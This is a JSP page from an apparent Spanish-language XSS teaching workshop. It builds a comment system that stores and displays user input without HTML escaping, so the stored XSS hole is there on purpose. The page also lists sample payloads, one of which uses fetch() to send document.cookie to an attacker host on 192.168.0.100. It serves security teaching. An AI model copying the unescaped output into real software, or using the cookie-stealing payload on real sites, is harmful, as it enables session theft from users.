<%@page import="com.jgranados.xss.workshop.db.DB"%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.util.*, java.text.SimpleDateFormat" %>
<%
DB database = (DB) application.getAttribute("DB");
    if (database == null) {
        database = new DB(application);

// Aplicación
        application.setAttribute("DB", database);

    }

// Agregar nuevo comentario
if ("POST".equalsIgnoreCase(request.getMethod())) {
    String username = request.getParameter("username");
    String comment = request.getParameter("comment");
    
    if (username != null && comment != null && !comment.trim().isEmpty()) {
        Map<String, String> newComment = new HashMap<>();
        newComment.put("id", String.valueOf(System.currentTimeMillis()));
        newComment.put("user", username);
        newComment.put("content", comment);
        newComment.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()));
        
        database.getCommentsDB().add(0, newComment); // Agregar al inicio
        
        // Guardar en archivo
        database.saveToFile();
    }
}
%>
<html>
<head>
    <title>Sistema de Comentarios - XSS Stored</title>
    <style>
        body { font-family: Arial; margin: 40px; }
        .comment-form { background: #fff3cd; padding: 20px; margin: 10px 0; }
        .comment { background: #f8f9fa; padding: 15px; margin: 10px 0; border-left: 4px solid #007bff; }
        .vulnerable { background: #f8d7da; padding: 10px; margin: 5px 0; }
        .payload-box { background: #e9ecef; padding: 10px; margin: 5px 0; font-family: monospace; }
    </style>
</head>
<body>
    <h1>💬 Sistema de Comentarios - XSS Stored</h1>
    
    <div class="vulnerable">
        <h3>⚠️ VULNERABILIDAD: Comentarios sin sanitización</h3>
        <p>Los comentarios se almacenan en la base de datos y se muestran a todos los usuarios sin escapado HTML.</p>
    </div>

    <div class="comment-form">
        <h3>📝 Agregar Nuevo Comentario</h3>
        <form method="POST">
            <label>Tu nombre:</label><br>
            <input type="text" name="username" value="Visitante" size="30"><br><br>
            
            <label>Tu comentario:</label><br>
            <textarea name="comment" rows="4" cols="50" placeholder="Escribe tu comentario aquí..."></textarea><br><br>
            
            <button type="submit">Publicar Comentario</button>
        </form>
    </div>

    <div class="payload-box">
        <h3>🎯 Payloads para XSS Stored en Comentarios:</h3>
        <code>&lt;script&gt;alert('XSS Stored en Comentarios!')&lt;/script&gt;</code><br>
        <code>&lt;img src=x onerror="alert('Cada usuario verá este alert!')"&gt;</code><br>
        <code>&lt;script&gt;fetch('http://192.168.0.100:8080/attackers-app/log.jsp?cookie='+document.cookie+'&info=page:comments')&lt;/script&gt;</code><br>
        <code>&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</code><br>
        <code>&lt;svg onload="setInterval(()=>alert('Persistente!'),5000)"&gt;</code>
    </div>

    <h2>💭 Comentarios Publicados (<%= database.getCommentsDB() != null ? database.getCommentsDB().size() : 0 %>)</h2>
    
    <% if (database.getCommentsDB() != null && !database.getCommentsDB().isEmpty()) { %>
        <% for (Map<String, String> comment : database.getCommentsDB()) { %>
            <div class="comment">
                <strong><%= comment.get("user") %></strong> 
                <small style="color: #666;">- <%= comment.get("timestamp") %></small>
                <div style="margin-top: 10px;"><%= comment.get("content") %></div>
            </div>
        <% } %>
    <% } else { %>
        <p>No hay comentarios aún. ¡Sé el primero en comentar!</p>
    <% } %>

    <div style="background: #d4edda; padding: 15px; margin: 20px 0;">
        <h3>🔍 Comportamiento de XSS Stored:</h3>
        <ul>
            <li>El comentario malicioso se almacena en la "base de datos"</li>
            <li>Cada usuario que visite esta página ejecutará el payload</li>
            <li>El ataque es persistente - sigue funcionando después de recargar</li>
            <li>¡Prueba recargando la página después de publicar un payload!</li>
        </ul>
    </div>

    <p><a href="stored-xss-index.jsp">← Volver al índice XSS Stored</a> | 
       <a href="index.jsp">← Volver al inicio</a></p>
</body>
</html>